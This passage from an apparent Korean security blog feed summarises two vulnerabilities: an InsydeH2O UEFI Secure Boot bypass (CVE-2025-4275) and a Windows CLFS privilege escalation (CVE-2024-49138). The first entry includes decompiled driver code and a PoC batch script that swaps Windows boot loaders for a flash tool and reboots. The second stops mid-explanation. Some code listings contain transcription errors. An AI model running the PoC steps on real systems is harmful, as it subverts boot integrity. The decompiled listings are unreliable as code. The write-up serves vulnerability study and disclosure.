      <category domain="https://hackyboiz.github.io/tags/SSH/">SSH</category>
      
      
      <comments>https://hackyboiz.github.io/2025/06/28/bekim/2025-06-28/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-4275: InsydeH2O의 NVRAM 변수를 통한 디지털 인증서 삽입으로 인한 Secure Boot bypass</title>
      <link>https://hackyboiz.github.io/2025/06/25/newp1ayer48/CVE-2025-4275/</link>
      <guid>https://hackyboiz.github.io/2025/06/25/newp1ayer48/CVE-2025-4275/</guid>
      <pubDate>Wed, 25 Jun 2025 13:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.kb.cert.org/vuls/id/211341&quot;&gt;https://www</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.kb.cert.org/vuls/id/211341">https://www.kb.cert.org/vuls/id/211341</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>InsydeH2O <em>**</em>Kernel 5.2~5.7</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>InsydeH2O UEFI &#xD38C;&#xC6E8;&#xC5B4; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; Secure Boot bypass &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC778;&#xC99D;&#xC11C; &#xC800;&#xC7A5;&#xC18C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; NVRAM &#xBCC0;&#xC218;&#xC758; &#xC548;&#xC804;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC0AC;&#xC6A9;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>UEFI&#xB294; &#xCD08;&#xAE30; &#xBD80;&#xD305; &#xC2DC;, &#xCD5C;&#xC2E0; &#xD38C;&#xC6E8;&#xC5B4; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;&#xD558;&#xACE0;, UEFI &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xACFC; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xACE0; OS &#xB85C;&#xB354;&#xB85C; &#xB118;&#xC5B4;&#xAC00;&#xB294; &#xACFC;&#xC815;&#xC744; &#xAC70;&#xCE69;&#xB2C8;&#xB2E4;. &#xD38C;&#xC6E8;&#xC5B4; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB294; <code>isflash.bin</code> UEFI &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC0AC;&#xC6A9;&#xB418;&#xBA70;, &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; &#xC11C;&#xBA85;&#xC740; Insyde &#xC778;&#xC99D;&#xC11C;&#xB85C; &#xC11C;&#xBA85;&#xB418;&#xB294; Secure Boot &#xB9E4;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC11C;&#xBA85; &#xAC80;&#xC99D; &#xACFC;&#xC815;&#xC740; <code>BdsDxe</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xD38C;&#xC6E8;&#xC5B4; &#xC678;&#xBD80;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xC5B4; &#xD38C;&#xC6E8;&#xC5B4; &#xC5C5;&#xB370;&#xC774;&#xD130;&#xC758; &#xC11C;&#xBA85; &#xC778;&#xC99D;&#xC11C;&#xB97C; &#xC77D;&#xACE0;, <code>SecurityStubDxe</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xC5EC; Authenticode &#xC11C;&#xBA85; &#xAC80;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC804;&#xB2EC; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>SecureFlashDxe</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xC99D;&#xC11C;&#xB97C; &#xD718;&#xBC1C;&#xC131; NVRAM &#xBCC0;&#xC218;&#xC5D0; &#xB85C;&#xB4DC; &#xD558;&#xB3C4;&#xB85D; &#xBCC0;&#xC218;&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">_int64 <span class="hljs-title">LoadCertificateToVariable</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{UINTN v0; <span class="hljs-comment">// rbx</span>int64 v1; <span class="hljs-comment">// rbx</span>EFI_FIRMWARE_VOLUME2_PROTOCOL *Interface; <span class="hljs-comment">// [rsp+40h] [rbp-28h] BYREF</span>UINTN DataSize; <span class="hljs-comment">// [rsp+48h] [rbp-20h] BYREF</span>EFI_HANDLE *Buffer; <span class="hljs-comment">// [rsp+50h] [rbp-18h] BYREF</span><span class="hljs-keyword">char</span> v6; <span class="hljs-comment">// [rsp+80h] [rbp+18h] BYREF</span>UINT32 v7; <span class="hljs-comment">// [rsp+88h] [rbp+20h] BYREF</span>UINTN NoHandles; <span class="hljs-comment">// [rsp+90h] [rbp+28h] BYREF</span><span class="hljs-keyword">void</span> *Data; <span class="hljs-comment">// [rsp+98h] [rbp+30h] BYREF</span>Interface = <span class="hljs-number">0</span>;v7 = <span class="hljs-number">0</span>;<span class="hljs-keyword">if</span> ((gBS-&gt;LocateHandleBuffer(ByProtocol, &amp;EFI_FIRMWARE_VOLUME2_PROTOCOL_GUID, <span class="hljs-number">0</span>, &amp;NoHandles, &amp;Buffer) &amp; <span class="hljs-number">0x8000000000000000</span>uLL) == <span class="hljs-number">0L</span>L&amp;&amp; NoHandles ){v0 = <span class="hljs-number">0</span>;<span class="hljs-keyword">while</span> ((gBS-&gt;HandleProtocol(Buffer [v0], &amp;EFI_FIRMWARE_VOLUME2_PROTOCOL_GUID, (<span class="hljs-keyword">void</span> **)&amp;Interface) &amp; <span class="hljs-number">0x8000000000000000</span>uLL) == <span class="hljs-number">0L</span>L){Data = <span class="hljs-number">0</span>;DataSize = <span class="hljs-number">0</span>;<span class="hljs-keyword">if</span> ((Interface-&gt;ReadSection (Interface, &amp;SECURE_FLASH_FV_CERT_GUID, <span class="hljs-number">0x19</span>u, <span class="hljs-number">0</span>, &amp;Data, &amp;DataSize, &amp;v7) &amp; <span class="hljs-number">0x8000000000000000</span>uLL) != &#xD8;LL &amp;&amp; ++v0 &lt; NoHandles ){<span class="hljs-keyword">continue</span>;<span class="hljs-keyword">if</span> (v0 &gt;= NoHandles )<span class="hljs-keyword">return</span> EFI_NOT_FOUND;v1 = gRT-&gt;SetVariable((CHAR16 *)<span class="hljs-string">L&quot;SecureFlashCertData&quot;</span>, &amp;SECURE_FLASH_INFO_GUID,VARIABLE_ATTRIBUTE_BS_RT,DataSize,Data);gBS-&gt;FreePool(Data);<span class="hljs-keyword">if</span> (v1 &gt;= <span class="hljs-number">0</span>){v6 = <span class="hljs-number">0</span>;<span class="hljs-keyword">return</span> gRT-&gt;SetVariable((CHAR16 *) <span class="hljs-string">L&quot;SecureFlashSetupMode&quot;</span>, &amp;SECURE_FLASH_INFO_GUID, <span class="hljs-number">6u</span>, <span class="hljs-number">1u</span>, &amp;v6);}<span class="hljs-keyword">return</span> v1;}}<span class="hljs-keyword">return</span> EFI_NOT_FOUND;}</code></pre><p><code>BdsDxe</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C;&#xB294; NVRAM &#xBCC0;&#xC218;&#xC778; <code>SecureFlashSetupMode</code>&#xC640; EFI_SIGNATURE_LIST &#xD615;&#xC2DD;&#xC758; &#xC778;&#xC99D;&#xC11C;&#xAC00; &#xD3EC;&#xD568;&#xB41C; <code>SecureFlashCertData</code>&#xC758; &#xB450; &#xAC1C;&#xC758; &#xBCC0;&#xC218;&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">char_fastcall <span class="hljs-title">VerifyBySecureFlashSignature</span><span class="hljs-params">( _int64 a1, _int64 a2)</span></span><span class="hljs-function"></span>{<span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// si</span>_int64 Variable; <span class="hljs-comment">// rax</span><span class="hljs-keyword">char</span> *v7; <span class="hljs-comment">// rbx</span>_int64 v8; <span class="hljs-comment">// rdi</span>UINTN v9; <span class="hljs-comment">// &#x433;8</span><span class="hljs-keyword">void</span> *v10; <span class="hljs-comment">// rcx</span>UINT8 Sha256Hash; <span class="hljs-comment">// rdx</span><span class="hljs-keyword">void</span> *CryptoServices Protocol; <span class="hljs-comment">// [rsp+30h] [rbp-10h] BYREF</span>unsigned_int64 v13; <span class="hljs-comment">// [rsp+38h] [rbp-8h] BYREF</span><span class="hljs-keyword">void</span> *v14; <span class="hljs-comment">// [rsp+80h] [rbp+40h] BYREF</span><span class="hljs-keyword">void</span> *Buffer; <span class="hljs-comment">// [rsp+88h] [rbp+48h] BYREF</span><span class="hljs-keyword">if</span> ((gBS-&gt;LocateProtocol(&amp;CRYPTO_SERVICES_PROTOCOL_GUID, <span class="hljs-number">0</span>, &amp;CryptoServices Protocol) &amp; <span class="hljs-number">0x8000000000000000</span>uLL) != &#xD8;LL)<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;Buffer = <span class="hljs-number">0</span>;v14 = <span class="hljs-number">0</span>;v5 = <span class="hljs-number">0</span>;LibGetVariable(aSecureFlashSetupMode, &amp;SECURE_FLASH_INFO_GUID, &amp;v13, &amp;v14);<span class="hljs-keyword">if</span> (v14){<span class="hljs-function">Variable <span class="hljs-title">LibGetVariable</span><span class="hljs-params">(aSecureFlashCertData, &amp;SECURE_FLASH_INFO_GUID, &amp;v13, &amp;Buffer)</span></span>;v7= (<span class="hljs-keyword">char</span> *)Buffer;<span class="hljs-keyword">if</span> (Variable &gt;= <span class="hljs-number">0</span>){v8 = <span class="hljs-number">0</span>;<span class="hljs-keyword">if</span> (v13 &gt; <span class="hljs-number">0x10</span>){v9 HashSize;v10: Buffer;<span class="hljs-keyword">do</span>{<span class="hljs-keyword">if</span> (*(_DWORD *)&amp;v7 [v8 + <span class="hljs-number">16</span>] &lt; <span class="hljs-number">0x1C</span>u)<span class="hljs-keyword">break</span>;v5 = (((_int64 (_fastcall **) (_int64, _int64, <span class="hljs-keyword">char</span> *, _int64, _QWORD, UINTN)) CryptoServicesProtocol + <span class="hljs-number">0x22</span>)) (al,a2,&amp;v7 [v8 + <span class="hljs-number">44</span>], *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *) &amp;v7 [v8 + <span class="hljs-number">24</span>] <span class="hljs-number">16L</span>L,*(_QWORD *)v10, ); <span class="hljs-comment">// AuthenticodeVerify</span><span class="hljs-keyword">if</span> (v5)<span class="hljs-keyword">break</span>;v10 = Buffer;v9 = HashSize;Sha256Hash = (UINT8 *):: Buffer [<span class="hljs-number">1</span>].Sha256Hash;<span class="hljs-keyword">if</span> (HashSize &amp;&amp; (UINT8 *):: Buffer-&gt;Sha256Hash != Sha256Hash ){<span class="hljs-keyword">if</span> (sub_350((UINT8 *):: Buffer-&gt;Sha256Hash, Sha256Hash, HashSize)){v5 = (*((_int64 (_fastcall **) (_int64, _int64, <span class="hljs-keyword">char</span> *, _int64, EFI_HASH_OUTPUT, UINTN)) CryptoServicesProtocol+ <span class="hljs-number">0x22</span>)) ( al, a2, &amp;v7 [v8 + <span class="hljs-number">44</span>], *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)&amp;v7 [v8 + <span class="hljs-number">24</span>] <span class="hljs-number">16L</span>L, :: Buffer [<span class="hljs-number">1</span>], HashSize);  <span class="hljs-comment">// AuthenticodeVerify</span><span class="hljs-keyword">if</span> (v5)<span class="hljs-keyword">break</span>;}v9 = HashSize;v10 = Buffer;}v8 += (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)&amp;v7 [v8 +<span class="hljs-number">16</span>];}<span class="hljs-keyword">while</span> (v8+ <span class="hljs-number">28</span> &lt; v13);}}<span class="hljs-keyword">if</span> (v7)gBS-&gt;FreePool(v7);gBS-&gt;FreePool(v14);}<span class="hljs-keyword">return</span> v5;}</code></pre><p><code>SecurityStubDxe</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; <code>SecureFlashSetupMode</code>&#xC640; <code>SecureFlashCertData</code> &#xB450; &#xBCC0;&#xC218; &#xAC12;&#xC774; &#xBAA8;&#xB450; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xC6B0;, &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC77D;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC11C; <code>SecureFlashSetupMode</code>&#xC640; <code>SecureFlashCertData</code> &#xC774; &#xB450; NVRAM &#xBCC0;&#xC218;&#xB294; &#xBCF4;&#xD638;&#xB418;&#xC9C0; &#xC54A;&#xAE30;&#xC5D0; &#xB7F0;&#xD0C0;&#xC784; &#xC911;&#xC5D0; &#xBCC0;&#xC870;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBCC0;&#xC870;&#xD55C; &#xB450; &#xBCC0;&#xC218;&#xB97C; <code>SecurityStubDxe</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xBA74;, <code>BdsDxe</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xC0DD;&#xC131;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xC18D;&#xC77C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4;&#xC5D0; &#xC624;&#xB294; &#xBAA8;&#xB4E0; &#xD56D;&#xBAA9;&#xC740; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xAC80;&#xC99D; &#xC5C6;&#xC774; &#xBAA8;&#xB450; &#xC2E0;&#xB8B0;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, <code>isflash.bin</code>&#xC758; Secure Boot &#xACFC;&#xC815; &#xBC0F; Insyde &#xC11C;&#xBA85; &#xD655;&#xC778;&#xC744; &#xBAA8;&#xB450; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>PoC&#xC758; &#xC77C;&#xBD80;&#xC778; <code>sfpoc.cmd</code>&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell">sfcd <span class="hljs-built_in">set</span>mountvol U: /smkdir U:\\EFI\\Insyde<span class="hljs-built_in">copy</span> isflash.bin U:\\EFI\\Insyde\\<span class="hljs-built_in">move</span> U:\\EFI\Boot\\bootx64.efi U:\\EFI\\Boot\\bootx64.efi.org<span class="hljs-built_in">move</span> U:\\EFI\Microsoft\\Boot\\bootmgfw.efi U:\\EFI\Microsoft\\Boot\\bootmgfw.efi.org<span class="hljs-built_in">copy</span> isflash.bin U:\\EFI\Boot\\bootx64.efi<span class="hljs-built_in">copy</span> isflash.bin U:\\EFI\Microsoft\\Boot\\bootmgfw.efi<span class="hljs-built_in">copy</span> bios.bin U:\\<span class="hljs-built_in">copy</span> fpt_signed.efi U:\\<span class="hljs-built_in">copy</span> sfpoc_signed.efi U:\\<span class="hljs-built_in">copy</span> startup_2.nsh U:\\<span class="hljs-built_in">copy</span> startup_1.nsh U:\\startup.nsh<span class="hljs-built_in">dir</span> U:pausemountvol U: /dshutdown /<span class="hljs-built_in">r</span> /t <span class="hljs-number">0</span></code></pre><p>&#xBCC0;&#xC870;&#xD55C; &#xAC01; <code>.efi</code> &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xBAA8;&#xB450; &#xBE4C;&#xB4DC;&#xD558;&#xACE0; &#xC11C;&#xBA85;&#xD55C; &#xC774;&#xD6C4;&#xC5D0; Windows&#xC5D0;&#xC11C; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC704; <code>sfpoc.cmd</code>&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74;, &#xC7AC;&#xBD80;&#xD305; &#xC774;&#xD6C4;&#xC5D0; &#xC218;&#xC815;&#xB41C; BIOS &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xCC98;&#xB7FC; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774; &#xBCC0;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC790;&#xC2E0;&#xC758; &#xC778;&#xC99D;&#xC11C;&#xB97C; &#xC800;&#xC7A5;&#xD55C; &#xD6C4;, UEFI &#xD658;&#xACBD;&#xC758; &#xCD08;&#xAE30; &#xBD80;&#xD305; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC0BD;&#xC785;&#xB41C; &#xC778;&#xC99D;&#xC11C;&#xB85C; &#xC11C;&#xBA85;&#xB41C; &#xC784;&#xC758;&#xC758; <code>.efi</code> &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798; &#xC601;&#xC0C1;&#xC73C;&#xB85C; PoC &#xC2DC;&#xC5F0;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><iframe width="560" height="315" src="https://www.youtube.com/embed/1uJF44S0LQw?si=0jSHTtroxe_RMXCo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Insyde&#xC5D0; &#xBCF4;&#xACE0;&#xB418;&#xC5C8;&#xC73C;&#xBA70;, &#xACF5;&#xAC1C; &#xD6C4; 90&#xC77C; &#xB9CC;&#xC5D0; &#xD328;&#xCE58; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-4275">https://nvd.nist.gov/vuln/detail/CVE-2025-4275</a></li><li><a href="https://coderush.me/hydroph0bia-part1/">https://coderush.me/hydroph0bia-part1/</a></li><li><a href="https://coderush.me/hydroph0bia-part2/">https://coderush.me/hydroph0bia-part2/</a></li><li><a href="https://github.com/NikolajSchlej/Hydroph0bia/tree/main/sfpoc">https://github.com/NikolajSchlej/Hydroph0bia/tree/main/sfpoc</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/Insyde-Software/">Insyde Software</category>
      
      <category domain="https://hackyboiz.github.io/tags/InsydeH2O/">InsydeH2O</category>
      
      <category domain="https://hackyboiz.github.io/tags/UEFI-firmware/">UEFI firmware</category>
      
      <category domain="https://hackyboiz.github.io/tags/Secure-Boot-bypass/">Secure Boot bypass</category>
      
      
      <comments>https://hackyboiz.github.io/2025/06/25/newp1ayer48/CVE-2025-4275/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-49138: Windows Common Log File System Driver Elevation of Privilege 취약점</title>
      <link>https://hackyboiz.github.io/2025/06/18/ogu123/cve-2024-49138/</link>
      <guid>https://hackyboiz.github.io/2025/06/18/ogu123/cve-2024-49138/</guid>
      <pubDate>Wed, 18 Jun 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://security.humanativaspa.it/cve-2024-49138-wi</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://security.humanativaspa.it/cve-2024-49138-windows-clfs-heap-based-buffer-overflow-analysis-part-1/">https://security.humanativaspa.it/cve-2024-49138-windows-clfs-heap-based-buffer-overflow-analysis-part-1/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>KB5048685 &#xC774;&#xC804; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows CLFS (Common Log File System)&#xB294; &#xB85C;&#xAE45; &#xB610;&#xB294; &#xBCF5;&#xAD6C; &#xC9C0;&#xC6D0;&#xC774; &#xD544;&#xC694;&#xD55C; &#xBAA8;&#xB4E0; &#xC0AC;&#xC6A9;&#xC790; &#xBAA8;&#xB4DC; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; CLFS&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>CVE-2024-49138 &#xCDE8;&#xC57D;&#xC810;&#xC740; BLF(Base Log File)&#xC758; GENERAL &#xBE14;&#xB85D;&#xC774; free &#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC544;, GENERAL &#xBE14;&#xB85D; &#xB0B4;&#xBD80; &#xCEE4;&#xB110; &#xAC1D;&#xCCB4; &#xD3EC;&#xC778;&#xD130;(<code>containerContext-&gt;pContainer</code>)&#xB97C; &#xC870;&#xC791;&#xD574;&#xC11C; EoP &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Layout-of-a-BLF-file"><a href="#Layout-of-a-BLF-file" class="headerlink" title="Layout of a BLF file"></a>Layout of a BLF file</h3><p><img src="/2025/06/18/ogu123/cve-2024-49138/image1.png" alt></p><p>&#xBA3C;&#xC800; BLF &#xD30C;&#xC77C;&#xC740; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC640; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB97C; &#xCD94;&#xC801;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD30C;&#xC77C;&#xB85C; &#xC5EC;&#xAE30;&#xC11C; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xB294; BLF&#xC640; &#xC5F0;&#xACB0;&#xB41C; &#xC0AC;&#xC6A9;&#xC790; &#xB370;&#xC774;&#xD130; &#xD30C;&#xC77C;&#xC785;&#xB2C8;&#xB2E4;. <code>CreateLogFile()</code>&#xC640; <code>AddLogContainer()</code> API&#xB97C; &#xD1B5;&#xD574; BLF &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xACE0; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>BLF &#xD30C;&#xC77C;&#xC740; &#xADF8;&#xB9BC;&#xACFC; &#xAC19;&#xC774; 6&#xAC1C; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xBE14;&#xB85D;&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xBA70; &#xCDE8;&#xC57D;&#xC810;&#xC774; GENERAL &#xBE14;&#xB85D;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xACE0; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xACE0; &#xC788;&#xC5B4; GENERAL &#xBE14;&#xB85D;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CLFS_LOG_BLOCK_HEADER</span></span><span class="hljs-class">{</span>    UCHAR MajorVersion;    UCHAR MinorVersion;    UCHAR Usn;    CLFS_CLIENT_ID ClientId;    USHORT TotalSectorCount;    USHORT ValidSectorCount;    ULONG Padding;    ULONG Checksum;    ULONG Flags;    CLFS_LSN CurrentLsn;    CLFS_LSN NextLsn;    ULONG RecordOffsets[<span class="hljs-number">16</span>];    ULONG SignaturesOffset;} CLFS_LOG_BLOCK_HEADER, *PCLFS_LOG_BLOCK_HEADER;</code></pre><p>GENERAL &#xBE14;&#xB85D;&#xC740; &#xB2E4;&#xB978; &#xBAA8;&#xB4E0; &#xBE14;&#xB85D;&#xACFC; &#xAC19;&#xC774; <code>CLFS_LOG_BLOCK_HEADER</code>&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xACE0;, &#xC774;&#xC5B4;&#xC11C; <code>BASE_RECORD_HEADER</code>&#xAC00; &#xB098;&#xC635;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CLFS_BASE_RECORD_HEADER</span></span><span class="hljs-class">{</span>    CLFS_METADATA_RECORD_HEADER hdrBaseRecord;    CLFS_LOG_ID cidLog;    ULONGLONG rgClientSymTbl[CLIENT_SYMTBL_SIZE];    ULONGLONG rgContainerSymTbl[CONTAINER_SYMTBL_SIZE];    ULONGLONG rgSecuritySymTbl[SHARED_SECURITY_SYMTBL_SIZE];    ULONG cNextContainer;    CLFS_CLIENT_ID cNextClient;    ULONG cFreeContainers;    ULONG cActiveContainers;    ULONG cbFreeContainers;    ULONG cbBusyContainers;    ULONG rgClients[MAX_CLIENTS_DEFAULT];    ULONG rgContainers[MAX_CONTAINERS_DEFAULT];  &lt;- here!    ULONG cbSymbolZone;    ULONG cbSector;    USHORT bUnused;    CLFS_LOG_STATE eLogState;    UCHAR cUsn;    UCHAR cClients;} CLFS_BASE_RECORD_HEADER, *PCLFS_BASE_RECORD_HEADER;</code></pre><p>&#xC5EC;&#xAE30;&#xC11C; <code>rgContainers</code> &#xD544;&#xB4DC;&#xB294; <code>CLFS_CONTAINER_CONTEXT</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xB300;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xC744; &#xC800;&#xC7A5;&#xD55C; &#xBC30;&#xC5F4;&#xC774;&#xBA70; <code>CLFS_CONTAINER_CONTEXT</code> &#xAD6C;&#xC870;&#xCCB4;&#xB294; &#xAC01; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CLFS_CONTAINER_CONTEXT</span></span><span class="hljs-class">{</span>    CLFS_NODE_ID cidNode;    ULONGLONG cbContainer;    CLFS_CONTAINER_ID cidContainer;    CLFS_CONTAINER_ID cidQueue;    <span class="hljs-keyword">union</span>    {        CClfsContainer* pContainer; &lt;-here        ULONGLONG ullAlignment;    };    CLFS_USN usnCurrent;    CLFS_CONTAINER_STATE eState;    ULONG cbPrevOffset;    ULONG cbNextOffset;} CLFS_CONTAINER_CONTEXT, *PCLFS_CONTAINER_CONTEXT;</code></pre><p><code>CLFS_CONTAINER_CONTEXT</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0;&#xC11C;&#xB294; <code>pContainer</code> &#xD544;&#xB4DC; &#xAC12;&#xC774; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xB514;&#xC2A4;&#xD06C;&#xC5D0;&#xC11C;&#xB294; 0&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC9C0;&#xB9CC;, BLF&#xAC00; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB85C;&#xB4DC;&#xB418;&#xBA74; 